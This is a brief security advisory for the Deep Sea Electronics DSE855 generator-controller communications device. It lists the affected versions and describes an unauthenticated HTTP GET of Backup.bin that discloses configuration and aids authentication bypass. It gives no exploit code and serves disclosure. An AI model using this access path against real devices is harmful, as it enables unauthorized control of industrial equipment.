Deep Sea Electronics DSE855 Remote Authentication Bypass


Vendor: Deep Sea Electronics plc
Product web page: https://www.deepseaelectronics.com
Affected version: Model: DSE855
                  Software version: 1.0.26
                  Module version: 1.0.78
                  Bootloader version: 1.0.3
                  Firmware version: 1.1.0

Summary: The DSE855 communications device allows monitoring of a single
DSE controller with USB connectivity over a LAN or WAN connection. To achieve
this the DSE855 utilises its in-built web server or MODBUS TCP. In order
to use over a LAN connection the on-site router must be configured to be
accessible from any global location.

Desc: The device is vulnerable to configuration disclosure when direct object
reference is made to the Backup.bin file using an HTTP GET request. This will
enable an attacker to disclose sensitive information and help her in authentication
bypass, privilege escalation and full system access.

Tested on: embOS/IP
